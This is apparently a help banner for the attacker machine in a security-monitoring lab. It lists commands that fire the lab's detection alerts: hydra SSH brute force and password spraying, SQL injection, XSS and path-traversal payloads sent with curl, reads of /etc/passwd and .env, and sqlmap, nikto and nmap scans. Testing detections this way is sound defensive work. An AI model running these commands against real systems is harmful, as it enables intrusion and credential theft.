@@ -1,0 +1,28 @@
+
+ IntelliSOC attack lab - attacker box (172.28.0.66)
+ Target: "target" (172.28.0.10) - sshd :22, nginx :80
+ ---------------------------------------------------------------------
+ SSH brute force that SUCCEEDS (-> SSH_BRUTE_FORCE + FAILED_THEN_SUCCESS)
+   hydra -l admin -P wordlists/passwords.txt -t 4 ssh://target
+
+ SSH password spraying across users (-> SSH_BRUTE_FORCE, EXCESSIVE_AUTH_FAILURES)
+   hydra -L wordlists/users.txt -P wordlists/passwords.txt -t 4 ssh://target
+
+ Manual login (password is password123)
+   ssh admin@target
+
+ Web attacks (-> SQL_INJECTION, XSS, PATH_TRAVERSAL, SENSITIVE_FILE_ACCESS)
+   curl "http://target/search?q=%27%20OR%201%3D1--"
+   curl "http://target/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users"
+   curl "http://target/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
+   curl --path-as-is "http://target/../../etc/passwd"
+   curl "http://target/.env"
+   sqlmap -u "http://target/search?q=test" --batch --level 2
+   nikto -h http://target
+
+ Recon (logged as plain requests / connections)
+   nmap -sV target
+
+ Re-running the same attack? Alerts for the same IP are deduplicated for
+ 30 min - mark the earlier alert RESOLVED or FALSE_POSITIVE first.
+ ---------------------------------------------------------------------
